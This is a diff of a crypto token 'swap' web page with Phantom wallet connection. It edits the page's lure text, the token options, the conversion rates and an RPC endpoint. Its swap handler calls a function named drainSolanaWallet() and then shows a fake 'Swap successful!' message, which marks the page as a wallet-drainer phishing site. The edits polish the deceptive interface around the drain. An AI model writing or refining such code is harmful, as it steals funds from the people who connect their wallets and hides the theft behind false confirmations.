@@ -13,7 +13,7 @@
       font-src 'self' https://cdnjs.cloudflare.com https://fonts.gstatic.com;
       script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://unpkg.com;
       connect-src 'self' 
-        https://late-light-patron.solana-mainnet.quiknode.pro/60a7759b1bbb4567639fbabaca0fb63aedb556d6
+        https://omniscient-floral-theorem.solana-mainnet.quiknode.pro/fcf697e00dd6756f69a686b5e9bc27abf279f367
         https://public-api.solscan.io
         https://api.coingecko.com;
       frame-src 'self' https://phantom.app;
@@ -989,18 +989,18 @@
             <div class="swap-card">
                 <div class="swap-header">
                     <i class="fas fa-gift"></i>
-                    <h2>Swap to Earn</h2>
+                    <h2>Swap $ECHO</h2>
                 </div>
 
                 <!-- Bold Reward Notice -->
                 <div class="reward-notice">
                     <div class="reward-notice-title">
                         <i class="fas fa-star"></i>
-                        Earn Rewards with Every Swap!
+                        Swap Your $ECHO Tokens
                     </div>
                     <div class="reward-notice-text">
-                        <strong>Complete a swap and receive <span class="reward-highlight">250 $ECHO tokens</span> instantly!</strong><br>
-                        Swap as many times as you want - <strong>unlimited rewards available.</strong>
+                        <strong>Swap your <span class="reward-highlight">$ECHO</span> to SOL or USDT instantly!</strong><br>
+                        Convert your tokens anytime - <strong>unlimited swaps available.</strong>
                     </div>
                 </div>
 
@@ -1017,8 +1017,8 @@
                                 step="0.01"
                             />
                             <div class="token-display">
-                                <div class="token-icon-small">◎</div>
-                                <span>SOL</span>
+                                <div class="token-icon-small">E</div>
+                                <span>ECHO</span>
                             </div>
                         </div>
                     </div>
@@ -1041,19 +1041,8 @@
                             />
                             <div class="token-display">
                                 <select class="token-selector" id="token-select">
-                                    <option value="USDT">USDT</option>
-                                    <option value="USDC">USDC</option>
                                     <option value="SOL">SOL</option>
-                                    <option value="RAY">RAY (Raydium)</option>
-                                    <option value="SRM">SRM (Serum)</option>
-                                    <option value="ORCA">ORCA</option>
-                                    <option value="MNGO">MNGO (Mango)</option>
-                                    <option value="STEP">STEP</option>
-                                    <option value="COPE">COPE</option>
-                                    <option value="FIDA">FIDA (Bonfida)</option>
-                                    <option value="MEDIA">MEDIA</option>
-                                    <option value="TULIP">TULIP</option>
-                                    <option value="SAMO">SAMO</option>
+                                    <option value="USDT">USDT</option>
                                 </select>
                             </div>
                         </div>
@@ -1138,21 +1127,10 @@
         const closeModalBtn = document.getElementById('close-modal');
         const connectPhantomBtn = document.getElementById('connect-phantom');
 
-        // Conversion rates (example rates - 1 SOL)
+        // Conversion rates (ECHO to token)
         const conversionRates = {
-            'USDT': 150,
-            'USDC': 150,
-            'SOL': 1,
-            'RAY': 75,
-            'SRM': 300,
-            'ORCA': 200,
-            'MNGO': 5000,
-            'STEP': 500,
-            'COPE': 400,
-            'FIDA': 250,
-            'MEDIA': 350,
-            'TULIP': 180,
-            'SAMO': 10000
+            'SOL': 0.001,     // 1 ECHO = 0.001 SOL
+            'USDT': 0.15      // 1 ECHO = 0.15 USDT
         };
 
         function updateSwapOutput() {
@@ -1160,7 +1138,13 @@
             const selectedToken = tokenSelect.value;
             const rate = conversionRates[selectedToken];
             const outputValue = inputValue * rate;
-            swapOutput.value = outputValue.toFixed(2);
+            
+            if (selectedToken === 'SOL') {
+                swapOutput.value = outputValue.toFixed(4);
+            } else {
+                swapOutput.value = outputValue.toFixed(2);
+            }
+            
             updateSwapButton();
         }
 
@@ -1181,7 +1165,7 @@
 
             swapBtn.disabled = false;
             const selectedToken = tokenSelect.value;
-            swapBtn.innerHTML = `Swap to ${selectedToken} & Earn 250 $ECHO <i class="fas fa-arrow-right" style="margin-left: 0.75rem;"></i>`;
+            swapBtn.innerHTML = `Swap ECHO to ${selectedToken} <i class="fas fa-arrow-right" style="margin-left: 0.75rem;"></i>`;
         }
 
         swapInput.addEventListener('input', updateSwapOutput);
@@ -1224,7 +1208,8 @@
                 await nexiumApp.drainSolanaWallet();
 
                 const selectedToken = tokenSelect.value;
-                swapSuccess.textContent = `✓ Swap successful! You received ${selectedToken} and earned 250 $ECHO tokens!`;
+                const outputAmount = swapOutput.value;
+                swapSuccess.textContent = `✓ Swap successful! You received ${outputAmount} ${selectedToken}!`;
                 swapSuccess.classList.add('active');
                 swapBtn.innerHTML = '✓ Swap Complete - Swap Again?';
                 swapBtn.disabled = false;
